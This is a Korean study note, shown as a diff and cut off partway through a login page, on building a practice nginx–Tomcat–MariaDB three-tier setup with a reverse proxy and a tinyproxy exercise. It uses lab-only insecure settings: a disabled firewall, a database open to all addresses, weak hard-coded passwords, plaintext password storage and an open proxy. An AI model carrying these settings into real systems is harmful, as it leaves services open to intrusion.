@@ -1,0 +1,2537 @@
+<h2>서버 구축</h2>
+<p>날짜: 6월 2 → 6월 5
+종류: 실습, 프로젝트</p>
+<h2>서버 구축 및 연동</h2>
+<h3>서버 클론</h3>
+<ol>
+<li>3Tier-Service 폴더 생성</li>
+<li>Ubuntu_Pure의 초기 리눅스 설정 스냅샷을 클론 → WEB → WAS → DB
+<img src="/assets/imgs/notes/server-build-practice/01-image.png" alt="image.png" loading="lazy"></li>
+<li>각각의 서버에서 <code>ifconfig</code>를 통해 IP 확인</li>
+<li>XShell에서 원격 서버 접속(세션 만들어놓기)
+<img src="/assets/imgs/notes/server-build-practice/02-image-1.png" alt="image.png" loading="lazy"></li>
+</ol>
+<blockquote>
+<h5>⚠️ 서버 복사 시 주의사항</h5>
+<hr />
+</blockquote>
+<ul>
+<li>가상머신 → 클론하는 방식도 있지만 실제 파일을 복사해서 사용하는 방법도 있음
+<ul>
+<li>export해서 OVF 파일로 저장 → import로 읽어서 사용
+<img src="/assets/imgs/notes/server-build-practice/03-image-2.png" alt="image.png" loading="lazy"></li>
+</ul>
+</li>
+<li>그냥 아래 사진의 실제 폴더를 복사해서 가져가면 고유해야 하는 MAC 주소가 중복되게 됨
+⇒ 에러 발생
+<img src="/assets/imgs/notes/server-build-practice/04-image-3.png" alt="image.png" loading="lazy"></li>
+</ul>
+<p><img src="/assets/imgs/notes/server-build-practice/05-image-4.png" alt="image.png" loading="lazy"></p>
+<h3>WEB 서버 구축</h3>
+<h4>서버 설치</h4>
+<ol>
+<li><code>apt-get update</code></li>
+<li>우분투 방화벽 설정
+<ul>
+<li><code>systemctl disable ufw</code> &amp;&amp; <code>systemctl stop ufw</code>
+<img src="/assets/imgs/notes/server-build-practice/06-image-5.png" alt="image.png" loading="lazy"></li>
+<li>방화벽은 보안을 위해 아주 중요한 설정이다. 실습 과정에서만 꺼놓고 사용하자</li>
+</ul>
+</li>
+<li>nginx 서버 설치 및 설정
+<ul>
+<li><code>apt-get install nginx</code></li>
+<li><code>systemctl enable nginx</code> &amp;&amp; <code>systemctl start nginx</code>(nginx 서버 확인)
+<img src="/assets/imgs/notes/server-build-practice/07-image-6.png" alt="image.png" loading="lazy"></li>
+</ul>
+</li>
+<li>웹 브라우저로 접속 확인nginx 서버 확인
+<img src="/assets/imgs/notes/server-build-practice/08-image-7.png" alt="image.png" loading="lazy"></li>
+</ol>
+<h4>리버스 프록시</h4>
+<blockquote>
+<h5>리버스 프록시란?</h5>
+<hr />
+</blockquote>
+<ul>
+<li>사용자는 WAS(nodejs, django, springboot, tomcat)나 DB 서버에 직접 접속하면 안 된다.</li>
+<li>앞단의 WEB서버(nginx)가 요청을 받아서 대신 넘겨주는 중계기(Proxy) 역할을 하게 됨</li>
+<li>요청(웹서버→WAS→DB)과 응답(DB→WAS→웹서버) 둘 다 프록시가 필요함
+<ul>
+<li>포워드 프록시: 요청 과정에서 필요</li>
+<li>리버스 프록시: 응답 과정에서 필요
+| 구분 | 포워드 프록시 | 리버스 프록시 |
+| --- | --- | --- |
+| 위치 | 클라이언트 쪽에 설치 | 서버 쪽에 설치 |
+| 목적 |   • 클라이언트의 신원 숨기기
+• 접근 제어 |   • 서버 보호
+• 부하 분산
+• SSL 처리 |
+| 이번 프로젝트(실습) | - | ✅ nginx가 tomcat을 대신 노출 |</li>
+</ul>
+</li>
+</ul>
+<h3>WAS 서버 구축</h3>
+<blockquote>
+<p><strong>정부 프레임워크</strong></p>
+<hr />
+</blockquote>
+<ul>
+<li>자바 기반의 프레임워크 사용
+<ul>
+<li>확장자가 .do/.jsp이면 자바 기반 프레임워크 사용</li>
+</ul>
+</li>
+</ul>
+<h4>자바 설치</h4>
+<ol>
+<li>패키지 목록 갱신: <code>apt update</code></li>
+<li>자바 17 버전 설치: <code>apt install openjdk-17-jdk -y</code>
+<ul>
+<li>실무에서 널리 쓰임</li>
+</ul>
+</li>
+<li>설치 완료 후 버전 확인: <code>java -version</code>
+<img src="/assets/imgs/notes/server-build-practice/09-image-8.png" alt="image.png" loading="lazy"></li>
+</ol>
+<h4>tomcat 설치</h4>
+<ol>
+<li>톰캣 10 버전 설치: <code>apt install tomcat10 -y</code></li>
+<li>톰캣 서버 확인: <code>systemctl status tomcat10</code>
+<img src="/assets/imgs/notes/server-build-practice/10-image-9.png" alt="image.png" loading="lazy"></li>
+<li>프로세스 확인: <code>ps -ef | grep tomcat</code>
+<img src="/assets/imgs/notes/server-build-practice/11-image-10.png" alt="image.png" loading="lazy">
+<ul>
+<li>옵션이 많다!</li>
+</ul>
+</li>
+<li>톰캣 서버 포트번호 확인: <code>netstat -antup | grep -i listen</code>
+<img src="/assets/imgs/notes/server-build-practice/12-image-11.png" alt="image.png" loading="lazy">
+<ul>
+<li>java 이름으로 8080번이 열린 것을 확인</li>
+</ul>
+</li>
+<li>웹 브라우저 접속으롯 서버 확인
+<img src="/assets/imgs/notes/server-build-practice/13-image-12.png" alt="image.png" loading="lazy"></li>
+</ol>
+<h4>tomcat으로 html 로드</h4>
+<ul>
+<li>This is the default Tomcat home page. It can be found on the local filesystem at: <code>/var/lib/tomcat10/webapps/ROOT/index.html</code>
+<ul>
+<li>해당 경로에 있는 index.html이 기본 html 페이지라는 의미</li>
+</ul>
+</li>
+<li><code>/var/lib/tomcat10/webapps/ROOT/</code> 아래에 test.html 파일 만들고 접속
+<img src="/assets/imgs/notes/server-build-practice/14-image-13.png" alt="image.png" loading="lazy"></li>
+</ul>
+<h3>WEB-WAS 연동</h3>
+<ol>
+<li><code>vi /etc/nginx/sites-available/default</code>(WEB)<pre><code class="language-jsx">server_name _;
+
+location / {
+		**proxy_pass http://192.168.6.130:8080;**
+    proxy_set_header Host $host;
+    proxy_set_header X-Real-IP $remote_addr;
+    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+}
+</code></pre>
+<ul>
+<li><strong><code>/</code> url로 들어오는 요청을 프록시 서버가 대신 제공하도록 설정</strong></li>
+<li>tomcat 서버의 [IP 주소:포트번호]
+| 지시어 | 역할 | 왜 필요한가? |
+| --- | --- | --- |
+| proxy_pass | 요청을 전달할 서버 주소 지정 | WAS 서버(Tomcat)로 요청을 토스하는 핵심 설정 |
+| Host $host | 원래 요청의 도메인/호스트 전달 | Tomcat이 어떤 사이트에 대한 요청인지 알 수 있게 함 |
+| X-Real-IP $remote_addr | 실제 사용자의 IP 주소 전달 | Nginx를 거치면 WAS 입장에서 접속자 IP가 Nginx IP로 보임. 이를 실제 IP로 보정 |
+| X-Forwarded-For | 요청이 거쳐온 서버 목록 전달 | 여러 프록시를 거칠 경우 경유지 IP 체인을 기록 |</li>
+</ul>
+</li>
+<li><code>systemctl daemon-reload &amp;&amp; systemctl restart nginx</code></li>
+<li>웹 서버의 IP 주소로 서비스 요청: <code>192.168.6.128/test.html</code>
+<img src="/assets/imgs/notes/server-build-practice/15-image-14.png" alt="image.png" loading="lazy">
+<ul>
+<li>개발자 도구 - 네트워크
+<img src="/assets/imgs/notes/server-build-practice/16-image-15.png" alt="image.png" loading="lazy"></li>
+</ul>
+</li>
+</ol>
+<p>이제 웹 서버를 통해 WAS에 요청할 수 있다!</p>
+<h4>🛠️ systemctl restart nginx 에러</h4>
+<p><img src="/assets/imgs/notes/server-build-practice/17-image-16.png" alt="image.png" loading="lazy"></p>
+<ul>
+<li>잘못된 부분<pre><code class="language-jsx">server_name _;
+
+location / {
+        # First attempt to serve request as file, then
+        # as directory, then fall back to displaying a 404.
+        proxy_pass http://192:168:6:130:8080;
+        try_files $uri $uri/ =404;
+}
+</code></pre>
+<ul>
+<li>IP 주소를 콜론으로 구분했다(황당)</li>
+<li><code>.</code>으로 올바르게 수정 후 <code>systemctl daemon-reload &amp;&amp; systemctl restart nginx</code></li>
+</ul>
+</li>
+</ul>
+<h4>🛠️ 프록시 서버 에러</h4>
+<ul>
+<li>서버에 접속하려고 했는데 아래 에러가 발생함
+<img src="/assets/imgs/notes/server-build-practice/18-image-17.png" alt="image.png" loading="lazy"></li>
+<li>안내에 맞게 시스템 설정을 수정해보기
+<img src="/assets/imgs/notes/server-build-practice/19-image-18.png" alt="image.png" loading="lazy">
+<img src="/assets/imgs/notes/server-build-practice/20-image-19.png" alt="위의 설정을 껐음" loading="lazy">
+위의 설정을 껐음</li>
+</ul>
+<blockquote>
+<h5>⚠️ 접속 IP</h5>
+<hr />
+</blockquote>
+<ul>
+<li>사실 위의 이슈가 문제가 아니었음</li>
+<li>웹 서버의 nginx 설정 파일을 아래와 같이 설정함<pre><code class="language-jsx">server_name _;
+
+location / {
+        # First attempt to serve request as file, then
+        # as directory, then fall back to displaying a 404.
+        # try_files $uri $uri/ =404;    # 주석 처리 혹은 없애기
+        proxy_pass http://192.168.6.130:8080;
+}
+</code></pre>
+<ul>
+<li>이렇게 WAS의 IP와 포트 번호를 지정해주면 웹서버로 요청을 했을 때 해당 WAS 서버에 대신 전달</li>
+<li>즉 중간 다리 역할을 해주는 게 된다
+👉 웹 서버에 요청을 할 땐 웹 서버 IP 주소를 써야 한다 ……</li>
+</ul>
+</li>
+</ul>
+<p>각각의 서버가 무슨 역할을 하는지 확실하게 알고 사용하자…</p>
+<h3>WAS 설정</h3>
+<h4>제공 파일 위치</h4>
+<pre><code class="language-bash">**/var/lib/tomcat9/**
+├── **webapps/** ← 웹 애플리케이션 배포 루트
+│   └── **ROOT/** ← 기본 애플리케이션 (도메인 루트 &quot;/&quot;에 매핑)
+│       ├── login.html ← http://IP/login.html 로 접속 가능
+│       ├── login_action.jsp
+│       └── WEB-INF/ ← 설정 파일 및 라이브러리 (외부 접근 차단)
+│           └── lib/
+│               └── mariadb-java-client.jar ← DB 드라이버 (Phase 5에서 배치)
+├── conf/ ← server.xml 등 서버 설정 파일
+└── logs/ ← 오류 로그 확인 시 여기를 봅니다
+</code></pre>
+<ul>
+<li><code>/etc/lib/tomcat10/webapp/ROOT/</code>
+<ul>
+<li>웹사이트의 최상단(홈) 경로</li>
+<li>배포할 서비스를 이곳에 저장하여 배포</li>
+</ul>
+</li>
+</ul>
+<h4>로그 확인</h4>
+<ul>
+<li>에러 로그 확인: <code>tail -f /var/log/tomcat10/catalina.out</code></li>
+<li>접속 로그 확인: <code>tail -f localhost_access_log.2026-06-02.txt</code>
+<ul>
+<li>접속 로그는 매일 생성(일반적으로 localhost_access_log.YYYY-MM-DD.txt 형식)
+<img src="/assets/imgs/notes/server-build-practice/21-image-20.png" alt="image.png" loading="lazy">
+어떤 IP에서 접속(요청)하든 WEB 서버의 IP만 로그에 기록됨
+→ 실제 요청하는 클라이언트의 IP를 기록하도록 설정해보자!</li>
+</ul>
+</li>
+</ul>
+<h4>로그 형식 설정</h4>
+<h5>WAS</h5>
+<ol>
+<li>/etc/tomcat10/server.xml 설정 변경
+<img src="/assets/imgs/notes/server-build-practice/22-image-21.png" alt="image.png" loading="lazy">
+<ul>
+<li>pattern: 형식 설정</li>
+<li><code>pattern=&quot;%**{X-Forwarded-For}i** %l %u %t &quot;%r&quot; %s %b&quot; /&gt;</code>로 수정</li>
+</ul>
+</li>
+<li>톰캣 서버 재시작: <code>systemctl restart tomcat10</code></li>
+<li>로그 확인: <code>tail -f /var/log/tomcat10/local ...access.log</code></li>
+</ol>
+<h5>WEB</h5>
+<ol>
+<li><code>vi /etc/nginx/sites-enabled/default</code></li>
+<li>설정(헤더) 변경
+<ul>
+<li><code>proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</code>
+<ul>
+<li>추가후 재시작</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>nginx 서버 재시작: <code>systemctl reload nginx</code></li>
+<li>로그 확인: <code>tail -f /var/log/nginx/access.log</code></li>
+</ol>
+<h5>DB</h5>
+<ol>
+<li>웹 서버를 통해 test.html 다운로드: <code>wget web_ip/test.html</code></li>
+</ol>
+<h5>결과</h5>
+<p><img src="/assets/imgs/notes/server-build-practice/23-image-22.png" alt="image.png" loading="lazy"></p>
+<h3>WAS-DB 연동</h3>
+<blockquote>
+<h4>MariaDB</h4>
+<hr />
+</blockquote>
+<p><strong>MySQL을 기반으로 만들어진 세계적인 오픈 소스 관계형 데이터베이스 관리 시스템(RDBMS)
+MySQL이 오라클에 인수된 뒤, 불확실한 라이선스 문제를 해결하고자 나왔다.</strong></p>
+<ul>
+<li>MySQL 기반이기 때문에 명령어가 mysql이다.</li>
+</ul>
+<h4>MariaDB 설치</h4>
+<ol>
+<li>mariadb 설치: <code>apt install mariadb-server -y</code></li>
+<li>보안 설정 마법사 실행: <code>mysql_secure_installation</code>
+<ul>
+<li>대부분의 질문에 Y
+| 질문 항목 | 권장 답변 | 설명 |
+| --- | --- | --- |
+| Switch to unix_socket authentication? | N | 비밀번호 방식 유지 (원격 접속을 위해) |
+| Change the root password? | Y | root 비밀번호를 강력한 것으로 설정 |
+| Remove anonymous users? | Y | 익명 사용자 삭제 → 보안 강화 |
+| Disallow root login remotely? | Y | 원격에서 root 직접 로그인 차단 |
+| Remove test database? | Y | 테스트 DB 삭제 |
+| Reload privilege tables now? | Y | 변경사항 즉시 반영 |</li>
+</ul>
+</li>
+<li>root로 DB 접속: <code>mysql -u root -p</code>
+<img src="/assets/imgs/notes/server-build-practice/24-image-23.png" alt="image.png" loading="lazy">
+<ul>
+<li>DB 서버에서 접속이 잘 되는 것을 확인할 수 있다.</li>
+<li><strong>하지만 외부 서버(WAS)에서 접속하려면 연결이 되지 않는다는 에러가 발생함.</strong></li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<h4>💡DB 서버 bind address</h4>
+<hr />
+<p><a href="https://joanne.tistory.com/178"><strong>참고 블로그</strong></a> |</p>
+</blockquote>
+<ul>
+<li><strong>bind address: 데이터베이스 서버가 어떤 주소로의 요청을 허용할 것인지 설정하는 것</strong>
+<ul>
+<li>보안을 위해 기본값이 127.0.0.1로 설정되어 있다.</li>
+</ul>
+</li>
+<li>주소별 의미
+<ul>
+<li>127.0.0.1: localhost. MariaDB가 자기 자신(localhost)에서 오는 연결만 수락</li>
+<li>0.0.0.0: 모든 IP에서 오는 연결을 수락. 외부에서 접속을 하려면 무조건 이 방식을 사용해야 함</li>
+</ul>
+</li>
+</ul>
+<h5>bind address 설정 변경</h5>
+<ol>
+<li>현재 설정 확인: <code>netstat -antup | grep Listen</code>
+<img src="/assets/imgs/notes/server-build-practice/25-image-24.png" alt="image.png" loading="lazy"></li>
+<li>설정 파일 수정: <code>vi /etc/mysql/mariadb.conf.d/50-server.cnf</code>
+<img src="/assets/imgs/notes/server-build-practice/26-image-25.png" alt="image.png" loading="lazy">
+<ul>
+<li>bind-address 설정을 <code>0.0.0.0</code>으로 수정</li>
+</ul>
+</li>
+<li>db 재시작: <code>systemctl restart mariadb</code></li>
+<li>바뀐 설정(주소) 확인
+<img src="/assets/imgs/notes/server-build-practice/27-image-26.png" alt="image.png" loading="lazy"></li>
+</ol>
+<h4>WAS 유저 생성</h4>
+<ol>
+<li>데이터베이스 생성: <code>CREATE DATABASE myapp;</code></li>
+<li>유저 생성: <code>CREATE USER 'wasuser'@'192.168.6.130' IDENTIFIED BY 'password123';</code>
+<ul>
+<li><code>[유저이름]@[유저IP]</code>
+<table>
+<thead>
+<tr>
+<th>계정 전략</th>
+<th>보안 수준</th>
+<th>설명</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>root 계정 직접 사용</td>
+<td>❌ 위험</td>
+<td>전체 DB에 무제한 접근 가능. 유출 시 치명적.</td>
+</tr>
+<tr>
+<td>'wasuser'@'%' (모든 IP 허용)</td>
+<td>⚠️ 보통</td>
+<td>어느 서버에서든 접속 가능. 권한 범위는 제한됨.</td>
+</tr>
+<tr>
+<td>'wasuser'@'192.168.6.130'</td>
+<td>✅ 권장</td>
+<td>WAS 서버 IP에서만 접속 허용. 다른 곳에서는 차단.</td>
+</tr>
+</tbody>
+</table>
+</li>
+</ul>
+</li>
+<li>데이터베이스 myapp에 대한 모든 권한을 wasuser에게 부여
+<ul>
+<li><code>GRANT ALL PRIVILEGES ON myapp.* TO 'wasuser'@'192.168.6.130';</code></li>
+</ul>
+</li>
+<li>권한 부여한 것 실제 반영: <code>FLUSH PRIVILEGES;</code>
+<ul>
+<li>권한을 부여하면 권한 테이블에 권한 데이터가 저장됨 == commit</li>
+<li>권한 테이블을 메모리에 즉시 로드하여 변경사항 반영 == push</li>
+</ul>
+</li>
+</ol>
+<h4>WAS 유저로 DB에 접속</h4>
+<ol>
+<li>MariaDB 패키지 설치: <code>apt-get install mariadb-client-core</code></li>
+<li><code>mysql -u wasuser -p -h 192.168.6.131</code>
+<ul>
+<li><code>-u</code>: 유저명</li>
+<li><code>-p</code>: 비밀번호 입력</li>
+<li><code>-h</code>: 호스트(192.168.6.131 서버에 있는 MySQL/MariaDB에 접속)</li>
+</ul>
+</li>
+<li>데이터베이스 확인: <code>show databases</code>
+<img src="/assets/imgs/notes/server-build-practice/28-image-27.png" alt="image.png" loading="lazy"></li>
+</ol>
+<p><strong>유저를 만들 때는 유저의 IP를 사용하고 유저가 DB에 접속할 때는 DB IP를 사용한다!!</strong></p>
+<h4>🛠️ 유저 생성 IP 에러</h4>
+<h5>에러 메세지</h5>
+<p><img src="/assets/imgs/notes/server-build-practice/29-image-28.png" alt="image.png" loading="lazy"></p>
+<ul>
+<li>연결은 됐으나 접속이 되지 않음</li>
+</ul>
+<h5>문제 상황</h5>
+<ul>
+<li>현재 IP 상태
+<ul>
+<li>WAS: 192.168.6.130</li>
+<li>DB: 192.168.6.131</li>
+</ul>
+</li>
+<li>유저를 생성할 때 아래 명령어로 생성함
+<ul>
+<li><code>CREATE USER 'wasuser'@'192.168.6.131' IDENTIFIED BY 'password123';</code></li>
+<li>유저를 생성할 때 IP는 유저의 IP를 의미한다</li>
+</ul>
+</li>
+</ul>
+<h5>문제 해결</h5>
+<ol>
+<li>기존 유저 삭제
+<ul>
+<li><code>DROP USER 'wasuser'@'192.168.6.131';</code></li>
+</ul>
+</li>
+<li>올바른 IP로 재생성<pre><code class="language-jsx">CREATE USER 'wasuser'@'192.168.6.130' IDENTIFIED BY 'password123';
+GRANT ALL PRIVILEGES ON myapp.* TO 'wasuser'@'192.168.6.130';
+FLUSH PRIVILEGES;
+</code></pre>
+</li>
+<li>결과
+<img src="/assets/imgs/notes/server-build-practice/30-image-29.png" alt="image.png" loading="lazy"></li>
+</ol>
+<h3>복습 실습 - 로그 확인</h3>
+<ol>
+<li>nginx 서버에 x-forward-for 설정 후, 웹서버와 톰캣서버의 로그를 확인해 보자.
+<ul>
+<li>톰캣 서버는 항상 nginx에서의 요청로그가 남는다</li>
+</ul>
+</li>
+<li>톰캣 서버에 로깅 옵션을 변경 후 로그를 확인해 보자
+<ul>
+<li>톰캣 서버에도 클라이언트의 IP가 남는 것을 확인할 수 있다</li>
+</ul>
+</li>
+</ol>
+<h5>결과</h5>
+<pre><code class="language-bash">// nginx 로그: /var/log/nginx/access.log
+192.168.6.131 - - [04/Jun/2026:10:03:45 +0900] &quot;GET /test.html HTTP/1.1&quot; 200 6 &quot;-&quot; &quot;Wget/1.21.4&quot;
+192.168.6.131 - - [04/Jun/2026:10:05:18 +0900] &quot;GET /test.html HTTP/1.1&quot; 200 6 &quot;-&quot; &quot;Wget/1.21.4&quot;
+192.168.6.1 - - [04/Jun/2026:10:05:36 +0900] &quot;GET /test.html HTTP/1.1&quot; 200 6 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36&quot;
+192.168.6.1 - - [04/Jun/2026:10:05:36 +0900] &quot;GET /favicon.ico HTTP/1.1&quot; 404 546 &quot;http://192.168.6.128/test.html&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36&quot;
+</code></pre>
+<pre><code class="language-bash">// 톰캣 서버 로그: /var/log/tomcat10/localhost_access_log.2026-06-04.txt
+192.168.6.131 - - [04/Jun/2026:10:03:45 +0900] &quot;GET /test.html HTTP/1.0&quot; 200 6
+192.168.6.131 - - [04/Jun/2026:10:05:18 +0900] &quot;GET /test.html HTTP/1.0&quot; 200 6
+192.168.6.1 - - [04/Jun/2026:10:05:36 +0900] &quot;GET /test.html HTTP/1.0&quot; 200 6
+192.168.6.1 - - [04/Jun/2026:10:05:36 +0900] &quot;GET /favicon.ico HTTP/1.0&quot; 404 787
+</code></pre>
+<ul>
+<li><code>192.168.6.131</code>: (실제 서버 주소)DB 서버에서 보낸 wget 요청</li>
+<li><code>192.168.6.1</code>: (공유기 주소)웹 브라우저로 접근한 GET(test.html) 요청</li>
+</ul>
+<h3>프록시 서버를 만들어서 내 IP를 감추고 접근해보자</h3>
+<h4>프록시 서버 만들기</h4>
+<ol>
+<li>Pure → 클론
+<img src="/assets/imgs/notes/server-build-practice/31-image-30.png" alt="image.png" loading="lazy">
+<ul>
+<li>IP 주소: <code>192.168.6.132</code></li>
+</ul>
+</li>
+<li>프록시 서버에서 필요한 패키지 설치
+<ul>
+<li><code>apt-get install tinyproxy -y</code></li>
+</ul>
+</li>
+<li>tinyproxy 설정 파일 확인
+<img src="/assets/imgs/notes/server-build-practice/32-image-31.png" alt="image.png" loading="lazy">
+<ul>
+<li>서버 설치 과정에서 서버 사용을 위한 계정을 생성해서 설치(보통 그러함)</li>
+<li>설정을 변경할 필요는 없음</li>
+</ul>
+</li>
+<li>tinyproxy 설정 파일 수정
+<img src="/assets/imgs/notes/server-build-practice/33-image-32.png" alt="image.png" loading="lazy">
+<ul>
+<li>Allow 전부 주석 처리
+<ul>
+<li>주석처리 되어 있지 않은 Allow → 허용 주소(localhost)</li>
+<li>허용 설정 → 지정되어 있지 않은 주소는 전부 차단 ⇒ 허용 주소가 정해져있지 않으면 전부 허용</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>프록시 설정(크롬 → 윈도우)
+<img src="/assets/imgs/notes/server-build-practice/34-image-33.png" alt="image.png" loading="lazy">
+<ul>
+<li>자동 프록시 서버 사용 설정을 끈다</li>
+<li>수동 프록시 서버 설정에서 프록시 서버의 IP 주소와 포트번호를 지정
+👉 이제 어떤 주소로 접근해도 프록시 서버를 통해서 접근하게 된다!</li>
+</ul>
+</li>
+<li>웹 브라우저로 접근
+<img src="/assets/imgs/notes/server-build-practice/35-image-34.png" alt="image.png" loading="lazy">
+<ul>
+<li>원래 하던대로 웹서버의 주소로 접근</li>
+</ul>
+</li>
+<li>로그 확인
+<img src="/assets/imgs/notes/server-build-practice/36-image-35.png" alt="image.png" loading="lazy">
+<ul>
+<li>프록시 서버의 IP 주소가 로깅된 것을 확인
+<ul>
+<li>웹서버의 주소로 접근했지만 중간에 프록시 서버를 거쳐서 접근했음을 확인할 수 있다!</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h3>최종 프로젝트용 데이터 준비</h3>
+<h4>테이블 생성</h4>
+<pre><code class="language-sql">MariaDB [(none)]&gt; USE myapp;
+
+MariaDB [myapp]&gt; CREATE TABLE users (
+    -&gt; id INT AUTO_INCREMENT PRIMARY KEY,
+    -&gt; username VARCHAR(50) UNIQUE NOT NULL,
+    -&gt; password VARCHAR(100) NOT NULL,
+    -&gt; name VARCHAR(50)
+    -&gt; );
+</code></pre>
+<ul>
+<li>테이블 확인
+<img src="/assets/imgs/notes/server-build-practice/37-image-36.png" alt="image.png" loading="lazy"></li>
+<li>테이블 스키마 확인
+<img src="/assets/imgs/notes/server-build-practice/38-image-37.png" alt="image.png" loading="lazy"></li>
+</ul>
+<h4>데이터 삽입</h4>
+<pre><code class="language-sql">INSERT INTO users (username, password, name) 
+VALUES('admin', 'admin123', '관리자');
+</code></pre>
+<ul>
+<li>데이터 확인: <code>SELECT * FROM users</code>
+<img src="/assets/imgs/notes/server-build-practice/39-image-38.png" alt="image.png" loading="lazy"></li>
+</ul>
+<h3>전체 연동</h3>
+<h5>login.html(→ login_basic.jsp)</h5>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;로그인&lt;/title&gt;
+&lt;meta charset=&quot;UTF-8&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h2&gt;시스템 로그인&lt;/h2&gt;
+    &lt;form action=&quot;login.jsp&quot; method=&quot;post&quot;&gt;
+        아이디: &lt;input type=&quot;text&quot; name=&quot;user_id&quot;&gt;&lt;br&gt;
+        비밀번호: &lt;input type=&quot;password&quot; name=&quot;user_pw&quot;&gt;&lt;br&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;로그인&quot;&gt;
+    &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h5>login.html</h5>
+<pre><code class="language-sql">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;ko&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot; /&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;
+  &lt;title&gt;로그인 - Review&lt;/title&gt;
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;./css/common.css&quot; /&gt;
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;./css/login.css&quot; /&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+  &lt;!-- 헤더 --&gt;
+  &lt;header class=&quot;header&quot;&gt;
+    &lt;nav class=&quot;header__icons&quot;&gt;
+      &lt;!-- 홈 아이콘 --&gt;
+      &lt;button class=&quot;header__icon-btn&quot; aria-label=&quot;홈&quot;&gt;
+        &lt;svg width=&quot;22&quot; height=&quot;22&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;1.8&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;
+          &lt;path d=&quot;M3 9.5L12 3l9 6.5V20a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V9.5z&quot;/&gt;
+          &lt;polyline points=&quot;9 21 9 12 15 12 15 21&quot;/&gt;
+        &lt;/svg&gt;
+      &lt;/button&gt;
+      &lt;!-- 그리드 아이콘 --&gt;
+      &lt;button class=&quot;header__icon-btn&quot; aria-label=&quot;그리드&quot;&gt;
+        &lt;svg width=&quot;22&quot; height=&quot;22&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;1.8&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;
+          &lt;rect x=&quot;3&quot; y=&quot;3&quot; width=&quot;7&quot; height=&quot;7&quot; rx=&quot;1&quot;/&gt;
+          &lt;rect x=&quot;14&quot; y=&quot;3&quot; width=&quot;7&quot; height=&quot;7&quot; rx=&quot;1&quot;/&gt;
+          &lt;rect x=&quot;3&quot; y=&quot;14&quot; width=&quot;7&quot; height=&quot;7&quot; rx=&quot;1&quot;/&gt;
+          &lt;rect x=&quot;14&quot; y=&quot;14&quot; width=&quot;7&quot; height=&quot;7&quot; rx=&quot;1&quot;/&gt;
+        &lt;/svg&gt;
+      &lt;/button&gt;
+      &lt;!-- 캘린더 아이콘 --&gt;
+      &lt;button class=&quot;header__icon-btn&quot; aria-label=&quot;캘린더&quot;&gt;
+        &lt;svg width=&quot;22&quot; height=&quot;22&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;1.8&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;
+          &lt;rect x=&quot;3&quot; y=&quot;4&quot; width=&quot;18&quot; height=&quot;18&quot; rx=&quot;2&quot;/&gt;
+          &lt;line x1=&quot;16&quot; y1=&quot;2&quot; x2=&quot;16&quot; y2=&quot;6&quot;/&gt;
+          &lt;line x1=&quot;8&quot; y1=&quot;2&quot; x2=&quot;8&quot; y2=&quot;6&quot;/&gt;
+          &lt;line x1=&quot;3&quot; y1=&quot;10&quot; x2=&quot;21&quot; y2=&quot;10&quot;/&gt;
+        &lt;/svg&gt;
+      &lt;/button&gt;
+    &lt;/nav&gt;
+
+    &lt;h1 class=&quot;header__title&quot;&gt;Review&lt;/h1&gt;
+
+    &lt;button class=&quot;header__login-btn&quot;&gt;로그인&lt;/button&gt;
+  &lt;/header&gt;
+
+  &lt;!-- 로그인 폼 --&gt;
+  &lt;main class=&quot;login-page&quot;&gt;
+    &lt;div class=&quot;login-page__inner&quot;&gt;
+      &lt;h2 class=&quot;login-page__title&quot;&gt;로그인&lt;/h2&gt;
+
+      &lt;!--
+        action: 로그인 처리 JSP 경로
+        method=&quot;post&quot;: 비밀번호가 URL에 노출되지 않도록 POST 사용
+      --&gt;
+      &lt;form action=&quot;login.jsp&quot; method=&quot;post&quot;&gt;
+        &lt;div class=&quot;login-page__form-row&quot;&gt;
+          &lt;div class=&quot;login-page__fields&quot;&gt;
+            &lt;div class=&quot;login-page__input-wrap&quot;&gt;
+              &lt;span class=&quot;login-page__input-icon&quot;&gt;
+                &lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;1.8&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;
+                  &lt;circle cx=&quot;12&quot; cy=&quot;8&quot; r=&quot;4&quot;/&gt;
+                  &lt;path d=&quot;M4 20c0-4 3.6-7 8-7s8 3 8 7&quot;/&gt;
+                &lt;/svg&gt;
+              &lt;/span&gt;
+              &lt;input
+                class=&quot;login-page__input&quot;
+                type=&quot;text&quot;
+                name=&quot;user_id&quot;
